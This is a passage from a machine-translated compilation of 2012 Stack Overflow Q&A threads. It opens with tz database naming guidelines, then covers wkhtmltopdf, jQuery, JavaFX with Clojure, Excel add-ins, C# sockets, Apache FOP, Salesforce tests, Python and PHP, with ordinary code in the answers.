*   仅使用有效的 POSIX 文件名组件（即，名称中除 ' `/`' 之外的部分）。在文件名组件中，仅使用 ASCII 字母、' `.`'、' `-`' 和 ' `_`'。不要使用数字，因为这可能会使 POSIX TZ 字符串产生歧义。文件名组件不得超过 14 个字符或以 ' `-`' 开头。例如，更喜欢“文莱”而不是“Bandar_Seri_Begawan”。
*   每个国家/地区的每个时区规则集至少包含一个位置。一个这样的位置就足够了。使用 ISO 3166（参见文件 iso3166.tab）来帮助确定某事物是否是一个国家。但是，像布维岛这样的无人居住的 ISO 3166 地区不需要位置，因为那里没有定义当地时间。
*   如果一个国家地区的所有时钟自 1970 年以来都一致，即使次区域的时钟在 1970 年之前不一致，也不要费心将多个位置包括在内。否则这些表会变得非常大。
*   如果名称不明确，请使用不那么模糊的替代名称；例如，许多城市被命名为 San Jose 和 Georgetown，因此更喜欢 'Costa_Rica' 到 'San_Jose' 和 'Guyana' 到 'Georgetown'。
*   保持位置紧凑。使用城市或小岛，而不是国家或地区，以便将来的任何时区更改不会将位置拆分为不同的时区。例如，更喜欢“巴黎”而不是“法国”，因为法国有多个时区。
*   使用主流英语拼写，例如更喜欢“Rome”而不是“Roma”，更喜欢“Athens”而不是真名（使用希腊字母）。POSIX 文件名限制鼓励此规则。
*   使用一个国家时区中人口最多的地点，例如更喜欢“上海”而不是“北京”。在人口相似的地点中，选择最知名的地点，例如更喜欢“罗马”而不是“米兰”。
*   使用单数形式，例如更喜欢“Canary”而不是“Canaries”。
*   省略常见的后缀，如“_Islands”和“_City”，除非这会导致歧义。例如，更喜欢 'Cayman' 到 'Cayman_Islands' 和 'Guatemala' 到 'Guatemala_City'，但更喜欢 'Mexico_City' 到 'Mexico' 因为墨西哥这个国家有多个时区。
*   使用 ' `_`' 表示空格。
*   在名称的缩写中省略 ' `.`'，例如更喜欢 'St_Helena' 而不是 'St._Helena'。
*   如果只是轻微违反上述规则，请勿更改已建立的名称。例如，不要仅仅因为米兰的人口增长到比罗马多一些，就将现有名称“罗马”更改为“米兰”。
*   如果更改了名称，请将其旧拼写放入`backward`文件中。

该文件`zone.tab`列出了用于命名时区规则文件的地理位置。它旨在成为地理区域规范名称的详尽列表。

* * *

请注意，最近（2012 年 8 月）在`tz@iana.org`邮件列表中出现了关于“上海优先北京”指南的争议。

# wkhtmltopdf - 带有 Wicked PDF 和字母间距问题的 HTML 到 PDF

> ID：12009670
> 
> 赞同：5
> 
> 时间：2012-08-17T16:32:22.167
> 
> 标签：wkhtmltopdf, pdfkit, wicked-pdf

使用 0.79 和 0.7.2 生成的 PDF 看起来与我的原始 HTML 略有不同。添加 show_as_html 标志按预期显示它，但是内联样式在 PDF 中的处理方式与它们在 HTML 预览中的处理方式不同。

具体来说，我遇到的问题是字母间距声明也没有正确呈现浮点数。因此，例如在具有字母间距的右侧浮动元素上，PDF 将字符间距过大并且从中心间隔开，以使文本部分离开屏幕而不是进一步向左碰撞以改变字母间距宽度.

这是原始的 HTML 片段：

```
<table width="800" border="0">

  <tr>
    <td colspan="3"><span style="font-family:Helvetica, Arial, sans-serif;font-size:10pt;margin-top:18px;text-transform:uppercase;float: right;letter-spacing:2pt">Winter 2013</span></td>
  </tr>
</table> 
```

这是进行渲染的代码：

`render :pdf => 'file_name', :template => 'template.html.erb', :layout => 'pdf.html'`

这是呈现的 HTML：http: [//jsfiddle.net/wX4DQ/](http://jsfiddle.net/wX4DQ/)

这是输出的 PDF：http: [//imgur.com/sdUPM](http://imgur.com/sdUPM)

[我注意到关于wkhtmltopdf](http://code.google.com/p/wkhtmltopdf/issues/list?can=2&q=letter+spacing&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=tiles)的一些错误报告似乎与此相关。这可能是这个问题的罪魁祸首，什么是可以接受的解决方法？

我尝试过不同的字体，但我真的必须使用 Helvetica。

关于在这里做什么或可行的解决方法有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-03T14:45:07.413

有很多事情会导致文本呈现和字母间距出现问题。如果您使用的是二进制文件，请尝试获取针对 QT 编译的二进制文件。如果您自己编译 wkhtmltopdf，请确保您编译它的系统安装并注册了一套不错的字体，否则字体看起来不正确。

此外，这一点 css 可以提供帮助，尤其是在复制/粘贴某些字符之间有随机额外空格的情况下：

```
body { text-rendering: optimize-speed; } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-07T14:20:10.463

我有一个类似的问题，我设法通过`font-family`从谷歌导入的更改来解决它。更多细节和可能的解决方法可以在[这个问题](https://stackoverflow.com/questions/38229101/rotativa-pdf-generation-does-not-respect-html-character-spacing)中找到。简而言之，这是解决问题的代码：

```
@import url('https://fonts.googleapis.com/css?family=Open+Sans');
body {
    font-family: "Open Sans";
} 
```

# jquery - Multiple similar elements, apply effects to single element at a time

> ID：12009679
> 
> 赞同：-1
> 
> 时间：2012-08-17T16:33:10.990
> 
> 标签：jquery

Kindly check the following code. Its an auto generated code. I wish to apply fadeIn() effect to **"thumb-info"** class only.

```
<div class="work-thumbs">
<article>
<div class="thumb"><img src="1.jpg" /></div>
<div class="thumb-info">Link #1 - Heading #1</div>
</article>

<article>
<div class="thumb"><img src="2.jpg" /></div>
<div class="thumb-info">Link #2 - Heading #2</div>
</article>
</div><!--/.work-thumbs--> 
```

I have written the jQuery code as follows but it applies to all the elements in the list.

```
$('.thumb').mouseenter(function(){
$('thumb-class').fadeIn('slow');
}); 
```

I want it to apply only to the element on which the cursor is hovering at the moment.

Thank you for your time.

EDIT: Thanks for your answers, but the **"thumb-info"** is a hidden element and on **".thumb"** hover only it will appear,so I cant use **thumb-info** class with **"this"** function. If that's what you are suggesting.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:35:44.420

Use jQuery .hover() and pass in $this.

```
$('.thumb-info').hover(function() {
  $(this).dosomething //
}); 
```

By using `this` in your function handler, you are only effecting the element being hovered.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:37:15.687

Use `$(this)` so that it doesn't apply it to all elements with that class.

```
$(".thumb").hover(function(){
    $(this).next().fadeIn();
},function(){
    $(this).next().fadeOut();
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:39:31.500

Because your are selecting all the elements with class of `thumb-info`, you can use the `next()` or `siblings()` methods, try this:

```
$('.thumb').hover(function(){
     $(this).next().fadeIn('slow');
     // or $(this).siblings('.thumb-info').fadeIn('slow');
},function(){
     $(this).next().fadeOut('slow');
     // or $(this).siblings('.thumb-info').fadeOut('slow');
}); 
```

**[Fiddle](http://jsfiddle.net/Sv4Ea/)**

1.  [next()](http://api.jquery.com/next/)
2.  [hover()](http://api.jquery.com/hover/)
3.  [siblings()](http://api.jquery.com/siblings/)

# clojure - 来自 Clojure repl 的 JavaFX

> ID：12009685
> 
> 赞同：11
> 
> 时间：2012-08-17T16:33:40.230
> 
> 标签：clojure, javafx-2

我开始学习 Clojure，我想尝试 JavaFX for GUI。我找到了这篇文章：[http](http://nailthatbug.net/2011/06/clojure-javafx-2-0-simple-app/) ://nailthatbug.ne​​t/2011/06/clojure-javafx-2-0-simple-app/ ，但我想通过 repl 启动它，以便快速测试和方便。

因此，例如，我可以在 repl 中写入并查看新窗口：

```
(defn main-start []
  (doto (JFrame. "Window!")
   (.setSize (java.awt.Dimension. 400 300))
   (.setVisible true))) 
```

有没有办法用 javafx.application.Application 做这样的事情 - 来查看新的 JavaFX 窗口？

谢谢。安德鲁。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-17T17:22:16.260

如果您阅读[JavaFX Application 类文档](http://docs.oracle.com/javafx/2/api/javafx/application/Application.html)，您会看到 Application 类是一个抽象类，不能直接实例化。这意味着，您至少必须创建 javafx.application.Application 的子类。

> 生命周期
> 
> JavaFX 应用程序的入口点是 Application 类。每当启动应用程序时，JavaFX 运行时都会按顺序执行以下操作：
> 
> 1.  构造指定 Application 类的实例
> 2.  调用 init() 方法
> 3.  调用 start(javafx.stage.Stage) 方法
> 4.  等待应用程序完成，当以下任一情况发生时会发生这种情况：应用程序调用 Platform.exit() 最后一个窗口已关闭且 Platform 上的 implicitExit 属性为 true 调用 stop() 方法 注意 start 方法是抽象的，必须被覆盖。

因此，您需要生成一个类 - 使用博客文章中可以看到的 gen-class 宏 - 使用 start 方法来启动应用程序。

编辑：使用添加的 gen-class 方法链接到示例应用程序
我创建了一个[Github 存储库，其中包含 Clojure 中的一个简单示例 JavaFX 应用程序](https://github.com/raju-bitter/clojure-javafx-example)。这是遵循 gen-class 方法的 Clojure 文件：

```
(ns jfx.app
  (:import (javafx.beans.value ChangeListener ObservableValue)
           (javafx.concurrent Worker$State)
           (javafx.event ActionEvent EventHandler)
           (javafx.scene Scene)
           (javafx.scene.control Button)
           (javafx.scene.layout StackPane)           
           (javafx.stage Stage)
           (javafx.scene.web WebView)))

(gen-class
 :name clj.jfx.App
 :extends javafx.application.Application
 :prefix "app-") 

(defn app-start [app ^Stage stage]
  (let [root (StackPane.)
        btn (Button.)
        web-view (WebView.)
        state-prop (.stateProperty (.getLoadWorker (.getEngine web-view)))
        url "http://clojure.org"]

    ;; Add a WebView (headless browser)
    (.add (.getChildren root) web-view)
    ;; Register listener for WebView state changes
    (.addListener state-prop
                  (proxy [ChangeListener] []
                    (changed [^ObservableValue ov
                              ^Worker$State old-state
                              ^Worker$State new-state]
                      (println (str "Current state:" (.name new-state)))
                      (if (= new-state Worker$State/SUCCEEDED)
                        (println (str "URL '" url "' load completed!"))))))
    ;; Load a URL
    (.load (.getEngine web-view) url)

    ;; add a Button with a click handler class floating on top of the WebView
    (.setTitle stage "JavaFX app with Clojure")
    (.setText btn "Just a button")
    (.setOnAction btn
                  (proxy [EventHandler] []
                    (handle [^ActionEvent event]
                      (println "The button was clicked"))))
    (.add (.getChildren root) btn)

    ;; Set scene and show stage
    (.setScene stage (Scene. root 800 600))
    (.show stage)))

(defn app-stop
  "Stop method is called when the application exits."
  [app]
  (println "Exiting application!")
  )

(defn launch
  "Launch a JavaFX Application using class clj.jfx.App"
  []
  (javafx.application.Application/launch clj.jfx.App (into-array String []))) 
```

*必须编译 jfx.app*命名空间才能启动应用程序，如果您直接在 REPL 中运行代码，这将不起作用。[如果您想尝试代码，请按照项目的 README.md 文件](https://github.com/raju-bitter/clojure-javafx-example)中使用 Maven 和 Leiningen 设置 JavaFX 的说明进行操作。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-22T04:14:47.630

虽然它仍处于起步阶段，但我已经能够使用来自 REPL 的 JavaFx 使用[Upshot](https://github.com/daveray/upshot)。主要技巧就是完全忽略`Application`并直接创建您的场景。为此，您只需要强制运行时进行初始化，其示例可以在[core.clj:69](https://github.com/daveray/upshot/blob/develop/src/upshot/core.clj#L69)中看到。另一个技巧是你所做的几乎所有事情都必须包装在一个`run-now`块中，以确保它在 JavaFX 线程上运行。JavaFX 在线程方面比 Swing 更挑剔。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-24T01:20:17.803

非常感谢戴夫。我还找到了 javafx.embed.swing.JFXPanel 的解决方案：

```
(ns to-dell3 
  (:import 
    (javafx.application Application Platform)
    (java.util Date)
    (javafx.scene Group Scene)
    (javafx.scene.text Font Text)
    (javax.swing JFrame SwingUtilities)
    ChartApp1
    javafx.scene.paint.Color
    javafx.embed.swing.JFXPanel))

(defn launch-javafx [] (SwingUtilities/invokeLater 
  (proxy [Runnable] [] (run [] 
                (let [frame2 (JFrame. "JFrame")
                      fxPanel2 (JFXPanel.)
                      ]
                  (do 
                    (.setSize frame2 500 200 )
                    (.setVisible frame2 true)
                    (.setDefaultCloseOperation frame2 JFrame/DISPOSE_ON_CLOSE)
                    (.add frame2 fxPanel2)
                    (Platform/runLater (proxy [Runnable] [] (run [] (let [root2 (Group.)
                                              scene2 (Scene. root2  Color/ALICEBLUE)
                                              text2 (Text.)]
                                          (do
                                            (.setX text2 40)
                                            (.setY text2 100)
                                            (.setFont text2 (Font. 25))
                                            (.setText text2 "Welcome to Clojure + REPL + JavaFX!")
                                            (.add (.getChildren root2) text2)
                                            (.setScene fxPanel2 scene2)
                                            ))))))))))) 
```

需要 JavaFX 2.2。在此之前，在 REPL 中：（Platform/setImplicitExit false）这是此代码的直接端口：[将 JavaFX 集成到 Swing 应用程序](http://docs.oracle.com/javafx/2/swing/swing-fx-interoperability.htm#CHDEDHGA) 中，因此它看起来非常必要和幼稚，因为我在 Clojure 世界中是菜鸟，可能是更有经验的人，重写这个以更 Clojureish 的方式。无论如何，它现在对我有用，我想到了两个启动器的概念：一个用于通过 (launch-javafx) 进行基于 repl 的开发，另一个用于发布：通过普通的 javafx.application.Application 启动器。我仍然不知道它们是否彼此等价（我的意思是在 javafx.embed.swing.JFXPanel 的情况下可以使用完整的 JavaFX API），如果是这样，这适合我现在的目标（通过 REPL 开发）。而且我仍在调查 Upshot 代码 - 可能会发现更温和。

# excel - Excel评估树错误？对插件函数的嵌套调用调用了 20,000 次

> ID：12009688
> 
> 赞同：1
> 
> 时间：2012-08-17T16:33:52.977
> 
> 标签：excel, excel-2003, excel-addins

Excel 2003，Windows XP SP3：

我们有许多 Excel 用户使用非常大、复杂的 Excel 工作簿。一个典型的工作簿可能有 60 多个工作表，大小超过 70MB。我们有一个 .xll 插件，我们制作并在这些电子表格中使用。我们的插件具有广泛的调试和日志记录功能。

我们注意到一些非常奇怪和不稳定的行为，我们无法始终如一地重现这些行为。我在这里描述了这个问题的一个典型表现。

一个电子表格的范围之一有一个公式数组，其中涉及对函数的嵌套调用，包括 Excel ss 函数和我们自己的插件函数。公式可能类似于：

```
{=IF(cndtn,AddinFcn1(rng,INDIRECT(VLOOKUP($A2549,rng2,col,0)),AddinFcn2(param)),-1)} 
```

其中 AddinFcn1 和 AddinFcn2 是我们插件中的注册函数。我们可以监控 Excel 调用每个插件函数的次数，并将所有调用匹配到导致调用的单元格或范围评估。如果我们在干净的 Excel 中加载插件和工作簿，然后计算工作簿（“F9”），计算可能会完成第一次、第二次甚至 10 次，我们可以看到对 AddinFcn2 和 AddinFcn1 的单个调用源于对包含上述公式的范围的评估。但*有些*次，事情开始变得疯狂：在第三个“F9”，内部 AddinFcn2 可能突然被 excel 调用 19 次，然后在第四个“F9”，内部 AddinFcn2 被调用 20,000 次。或者也许一切都很好，直到第 10 个“F9”在评估范围期间突然内部 AddinFcn2 被调用 19,000 次。奇怪的是，外部函数 AddinFcn1 仍然只被调用一次。

这种情况发生的时间或函数被调用的次数似乎没有韵律或理由。进入调用的数据，实际上是电子表格中各处的数据，每次 F9 都是相同的 - 从一个计算到下一个计算没有任何变化。

有没有人见过类似的行为？有没有人猜测是什么可能导致 Excel（不必要地）重新计算内部函数调用数十甚至数十万次？

# c# - .NET 等效于 Java 的 BufferedReader

> ID：12009695
> 
> 赞同：2
> 
> 时间：2012-08-17T16:34:36.737
> 
> 标签：c#, java, bufferedreader

我有 Java 中的代码

```
public void read() throws IOException {
    BufferedReader in = new BufferedReader(new InputStreamReader(this.socket.getInputStream(), "UTF8"));
    String requestURL = null;
    Vector property = new Vector();
    String line;
       //MORE OF CODE
} 
```

如果您需要完整的代码[，请在此处](http://pastebin.com/aFrRX4im)粘贴。

我想将其重写为 C#

但我不知道哪个相当于BufferReader。我有套接字，我想从套接字 InputStream 读取（使用 UTF8）

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T19:15:10.147

这样的事情应该对你有用，尽管我确信我错过了大量的异常条件处理和一些小事情，哦，优雅的服务器关闭。

```
static void Main( string[] args )
{
  string      localMachineName    = Dns.GetHostName() ;
  IPHostEntry localMachineInfo    = Dns.GetHostEntry( localMachineName ) ;
  IPAddress   localMachineAddress = localMachineInfo.AddressList[0] ;
  IPEndPoint  localEndPoint       = new IPEndPoint( localMachineAddress , PORT_NUMBER ) ;

  using ( Socket server = new Socket( localEndPoint.AddressFamily , SocketType.Stream , ProtocolType.Tcp ) )
  {
    server.Bind(   localEndPoint                    ) ;
    server.Listen( PENDING_CONNECTIONS_QUEUE_LENGTH ) ;

    while ( true )
    {
      using ( Socket        connection       = server.Accept()                                         )
      using ( NetworkStream connectionStream = new NetworkStream( connection       , FileAccess.Read , false ) )
      using ( TextReader    connectionReader = new StreamReader(  connectionStream , Encoding.UTF8  ) )
      {
        IPEndPoint remoteEndpoint = (IPEndPoint) connection.RemoteEndPoint ;

        string line ;
        while ( null != (line=connectionReader.ReadLine()) )
        {
          line = line.Trim() ;
          Console.WriteLine( "Client says: {0}" , line ) ;
          if ( string.Equals( "exit"     , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
          if ( string.Equals( "quit"     , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
          if ( string.Equals( "goodbye"  , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
          if ( string.Equals( "good-bye" , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
        }

        connection.Shutdown( SocketShutdown.Both ) ;
        connection.Close() ;
      }
    }

  }

} 
```

如果你想缓冲流，只需`NetworkStream`用 a 装饰实例`BufferedStream`：

```
using ( Socket     connection       = server.Accept()                                                            )
using ( Stream     connectionStream = new NetworkStream( connection       , FileAccess.Read , false            ) )
using ( TextReader connectionReader = new StreamReader( new BufferedStream( connectionStream ) , Encoding.UTF8 ) )
{
  IPEndPoint remoteEndpoint = (IPEndPoint) connection.RemoteEndPoint ;

  string line ;
  while ( null != (line=connectionReader.ReadLine()) )
  {
    line = line.Trim() ;
    Console.WriteLine( "Client says: {0}" , line ) ;
    if ( string.Equals( "exit"     , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
    if ( string.Equals( "quit"     , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
    if ( string.Equals( "goodbye"  , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
    if ( string.Equals( "good-bye" , line , StringComparison.InvariantCultureIgnoreCase ) ) break ;
  }

  connection.Shutdown( SocketShutdown.Both ) ;
  connection.Close() ;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:43:37.327

像下面这样的东西是可以比较的。

```
using(StreamReader reader = new StreamReader(Socket.GetStream(), Encoding.UTF8)) {
    while(reader.Peek() >= 0) {
        Console.WriteLine(reader.ReadLine()); // or something...
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:38:17.047

这取决于你想要什么。BufferedReader 缓冲来自*另一个*阅读器的数据。如果您只想要缓冲读取，则可以使用 StreamReader 之类的东西，具体取决于您想要读取数据的方式。

# java - Apache FOP - PDF 流式传输到 Commons 电子邮件附件

> ID：12009696
> 
> 赞同：1
> 
> 时间：2012-08-17T16:34:46.750
> 
> 标签：java, apache-fop, apache-commons-email

我正在使用带有 XSL-FO 的 Apache Fop 来生成 PDF。然后我尝试将 pdf 作为附件流式传输到 apache.commons.mail.HtmlEmail; 我收到带有附件的电子邮件，但是收到以下错误。长度 0 字节，无编码。我能够毫无问题地在文件系统上创建 pdf，所以我知道这段代码的 FOP 部分没有任何问题，所以我不确定它为什么不起作用。有人能告诉我我错过了什么吗？

我的代码。

```
private void sendBroadcastNofications(PurchaseRequest pr) {
    try {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        //Fop sevice used to generate pdf.
        this.xmlPDFGeneratorService.generatePDF(pr, outputStream);
        byte[] bytes = outputStream.toByteArray();

        //I'm not sure if "application/pdf" would be an issue since fop is giving 
        //it the MimeConstants.MIME_PDF
        DataSource source = new ByteArrayDataSource(bytes, "application/pdf");            
        EmailAttachment attachment = new EmailAttachment(source, "purchase_requisition.pdf", "Broadcast Purcahse Requisition");

        Util.email("Purchase Request " + pr.getPrNumber(), getGenerateMessage(pr), pr.getAuthorizer().getEmail(), attachment);

    } catch (IOException ex) {
        Logger.getLogger(EmailServiceImpl.class.getName()).log(Level.SEVERE, null, ex);
    }
}

public static void email(String subject, String message, String recipient, EmailAttachment attachment) {
    email(subject, message, Collections.singleton(recipient), Collections.singleton(attachment));
}

public static void email(String subject, String message, Set<String> recipients, Set<EmailAttachment> attachments) {
    try {
        HtmlEmail email = new HtmlEmail();

        email.setHostName("mailhost");
        email.setSubject(subject);
        email.setHtmlMsg(message);
        email.setFrom("company@domain.com");

        for (EmailAttachment attachment : attachments) {
            try {
                email.attach(attachment.getDataSource(), attachment.getName(), attachment.getDescription());
            } catch (EmailException ex) {
                System.err.println("Email Attachment Exception: " + ex.getMessage());
            }
        }

        for (String recipient : recipients) {
            email.addTo(recipient);
        }
        email.send();
    } catch (EmailException ex) {
        System.err.println("Email Failed to Send: " + ex.getMessage());
    }
} 
```

Fop类

```
public class XMLPDFGeneratorServiceImpl implements XMLPDFGeneratorService {

private static final File baseDir = new File(".");
private static final File xsltfile = new File(baseDir, "./PurchaseRequestPDF.xsl");

// configure fopFactory as desired
private final FopFactory fopFactory = FopFactory.newInstance();

public void generatePDF(PurchaseRequest pr, ByteArrayOutputStream outStream) {

    // configure foUserAgent as desired
    FOUserAgent foUserAgent = fopFactory.newFOUserAgent();

    try {

        // Setup output
        outStream = new ByteArrayOutputStream();

        // Construct fop with desired output format
        Fop fop = fopFactory.newFop(MimeConstants.MIME_PDF, foUserAgent, outStream);

        // Setup XSLT
        TransformerFactory factory = TransformerFactory.newInstance();
        Transformer transformer = factory.newTransformer(new StreamSource(xsltfile));

        // Set the value of a <param> in the stylesheet
        transformer.setParameter("versionParam", "2.0");

        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        generateXML(pr, stream);  

        byte[] out = stream.toByteArray(); 
        stream.close();

        ByteArrayInputStream in = new ByteArrayInputStream(out);
        // Setup input for XSLT transformation
        Source src = new StreamSource(in);

        // Resulting SAX events (the generated FO) must be piped through to FOP
        Result res = new SAXResult(fop.getDefaultHandler());

        // Start XSLT transformation and FOP processing
        transformer.transform(src, res);

    } catch (TransformerException ex) {
        Logger.getLogger(XMLPDFGeneratorServiceImpl.class.getName()).log(Level.SEVERE, null, ex);
    } catch (IOException ex) {
        Logger.getLogger(XMLPDFGeneratorServiceImpl.class.getName()).log(Level.SEVERE, null, ex);
    } catch (FOPException ex) {
        Logger.getLogger(XMLPDFGeneratorServiceImpl.class.getName()).log(Level.SEVERE, null, ex);
    }
}

public void generateXML(PurchaseRequest pr, ByteArrayOutputStream stream) {
    try {
        // create JAXB context and instantiate marshaller
        JAXBContext context = JAXBContext.newInstance(PurchaseRequest.class);
        Marshaller m = context.createMarshaller();
        m.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, Boolean.TRUE);
        m.setProperty("com.sun.xml.bind.xmlDeclaration", Boolean.FALSE);
        m.marshal(pr, new PrintWriter(stream));
    } catch (JAXBException ex) {
        Logger.getLogger(XMLPDFGeneratorServiceImpl.class.getName()).log(Level.SEVERE, "JAXB Failed to produce xml stream", ex);
    }
} 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T20:25:56.760

您正在覆盖 generatePDF() 中的 outStream，因此您传入的那个保持为空。删除该行并重试。

```
outStream = new ByteArrayOutputStream(); 
```

# salesforce - Salesforce：在测试类中全面避免州长限制

> ID：12009698
> 
> 赞同：5
> 
> 时间：2012-08-17T16:34:55.283
> 
> 标签：salesforce, apex-code, force.com

我无法在线获得有关此问题的任何可靠信息。但我认为这一定是一个影响很多人的问题。

基本上我在沙箱中编写了一个简单的触发器和测试类，对其进行了测试，当它很好时，我将它部署到 PRD。

我先尝试了验证模式，我得到了这个错误。

**System.LimitException：SOQL 查询过多：101**

此错误显示在其他一些测试类中发生。所以我觉得我的触发器中的测试用例运行了，再加上剩余的测试用例不知何故超出了限制。

所以我们的单元测试中 SOQL 查询的总数必须少于 100。这有点难以接受吧？我可以想象有这么多的测试用例，我们肯定需要超过 100 个查询。

那么有什么方法可以避免达到这个限制，因为 Salesforce 甚至在部署单行代码时都会运行所有测试用例。

我没有任何常见的嫌疑人……比如 for 循环中的 SOQL。

**更新：2012 年 8 月 19 日：我现在发布测试类和触发器的源代码**

**测试类：**

```
@isTest 
```

私有类 TestAccountDuplicateWebsiteTrigger {

```
static testMethod void myUnitTest() {
    try{
    // TO DO: implement unit test
    Test.startTest();
    Account a1;      
    a1 = new Account();
    a1.name = 'GMSTest';    
    a1.Website = 'www.test.com';            

    Account a2;      
    a2 = new Account();
    a2.name = 'GMSTest2';   
    a2.Website = 'www.test.com';            

    Account a3;      
    a3 = new Account();
    a3.name = 'GMSTest3';   
    a3.Website = 'www.test1.com';           

    insert a1;
    insert a2;
    //insert a3;
    Test.stopTest(); 

    }
    catch (Exception e)
    {
    }

} 
```

}

**扳机**

```
trigger osv_unique_website_for_account on Account (before insert, before update) {  

    //Map which has no duplicates with website as the key
    Map<String, Account> accountMap = new Map<String, Account>();

    for (Account account: System.Trigger.new)
    {
        //Ensure that during an update, if an website does not change - it should not be treated as a duplicate
        if ((account.Website != null) && (System.Trigger.isInsert ||            
            (account.Website != System.Trigger.oldMap.get(account.Id).Website))) 
            {
                //check for duplicates among the new accounts in case of a batch
                 if (accountMap.containsKey(account.Website)) 
                 {
                    account.Website.addError('Cannot save account. Website already exists.');
                 } 
                 else 
                 {
                    accountMap.put(account.Website, account);
                 }

            }       
    }

    //Now map containing new account websites has been created. 
    //Check them against the account websites that ALREADY EXIST in salesforce. If website exists, display error.
    for (Account account : [SELECT Website FROM Account WHERE Website IN :accountMap.KeySet()]) 
    {
        Account newAccount = accountMap.get(Account.Website);
        if (newAccount!=null)
        {
            newAccount.Website.addError('Cannot save account. Website already exists.');
        }
    } 
```

}

你能分享你的想法吗？

谢谢，

卡尔文

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-17T18:54:13.163

查看您的一些测试类会有所帮助，但需要注意的重要一点是您需要使用 Test.startTest() 和 Test.stopTest() 方法。这个想法是，您为设置测试所做的任何查询或 DML 操作都应该在 Test.startTest() 方法之前关闭。然后，在测试您的代码（例如执行一个方法）时，您要在 start 和 stop 方法调用之间进行测试。

这给出了单元测试上下文。这基本上会忽略在您的开始和停止测试之外完成的任何 dml 或查询，并且只计算在测试之间发生的事情。否则，所有设置代码和实际测试代码都被视为同一上下文的一部分，因此要计入限制。

这个链接应该对这个主题有更多的了解：[http ://wiki.developerforce.com/page/An_Introduction_to_Apex_Code_Test_Methods](http://wiki.developerforce.com/page/An_Introduction_to_Apex_Code_Test_Methods)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-29T18:03:22.357

要记住的另一件事是您在 for 循环中执行的 SOQL。您可以在循环之前创建一个列表并存储查询结果。这样您就不会遇到调控器限制的问题，因为每个事务只使用一个 SOQL 语句。

# python - 指数范围误差

> ID：12009702
> 
> 赞同：2
> 
> 时间：2012-08-17T16:35:18.140
> 
> 标签：python

我不断收到错误“IndexError：列表索引超出范围”

不知道我做错了什么它适用于一对夫妇运行一个错误我唯一能想到的是我得到的名字对于变量来说太长了

```
 mylist = [x +'.mp3' for x in re.findall(r'file=(.*?).mp3',the_webpage)]
    #Remove Duplicates
    if mylist:
        mylist.sort()
        last = mylist[-1]
        for i in range(len(mylist)-3, -1, -1):
            if last == mylist[i]:
                del mylist[i]
            else:
                last = mylist[i]
    print " "
    #takes the quotes out of the string
    #ti = titl1[0]
    n1 = titl1[0]
    n2 = song1[0]

    #sg = song1
    sname = "".join(tuple(n1 + "-" + n2 + ".mp3"))

    print sname
    url = mylist[0] 
```

结果

```
Traceback (most recent call last):
  File "grub.py", line 59, in <module>
    url = mylist[0]
IndexError: list index out of range 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:38:48.843

您的`IndexError`建议`mylist`是空的，这意味着您可能在循环中删除了比您想要的更多的元素（或者您的列表开始时是空的）。要排序和删除重复项，您可以这样做

```
mylist = sorted(set(mylist)) 
```

即使这样，也不能保证您不会得到一个空列表（如果您的列表一开始是空的，它不会神奇地获得更多元素）。您还可以在尝试分配之前确保您的列表不为空`url`：

```
#"Look Before You Leap"  (LBYL)
if mylist:  
   url = mylist[0]
else:
   url = '???' 
```

然而，一些（大多数）会认为`try`-`except`子句在这里更“pythonic”......

```
#Maybe it's "Easier to Ask Forgiveness than Permission" ... (EAFP)
try:
   url = mylist[0]
except IndexError:
   url = '???' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:37:49.417

这通常意味着`mylist`它没有索引 0，这可能意味着它实际上并不是您认为的列表。你有一个`if mylist`条件，这表明在某些情况下 mylist 可能是未定义的。也许这是其中一种情况？

# php - 服务器如何处理脚本？具体来说，运行一段时间的脚本

> ID：12009703
> 
> 赞同：0
> 
> 时间：2012-08-17T16:35:17.497
> 
> 标签：php, apache

我有一个脚本，它从服务器流式传输文件并将收集的数据一次保存为小块，以防止内存溢出，在主机服务器上。

我有没有提到它是一个 PHP 脚本？

这就是它的工作原理

```
//loop while data exists on the clients server side file.
while (!feof($xml_fp)) {

                   //grab data in proportions of specified chunk
                   //write the the collected chunk locally
                    //if there's an error, exit (improve error handling for final code)

             $result =  fwrite($local_fp, fread($xml_fp, $size), $size);

                   if($result === false){
        echo"<h1> ERROR </h1>";
        exit(); 
                            }

                   else    {
                $progress += $result;
                ob_flush(); 
                flush(); 
                ?>
               //state amount of data downloaded thus far
                <script>
                $('#progress').html(' ');
                $('#progress').append(<?php echo (float)$progress/(1024*1024) ?>);
                </script>
                <?php

             //if all goes well, increase time limit by a second
                set_time_limit(1);

                     }
}//while loop ends here 
```

该脚本在本地运行良好。我将不得不在具有不同大小文件的实时服务器上运行大量测试，以确保没有任何问题，但是文件大小可以从 50mb 到 200mb 不等。

请记住 fread 和 fwrite 函数的开销很大，我预计下载速率不会超过 40 kbps，并且我估计的平均下载时间因此脚本运行的持续时间约为 10 分钟。

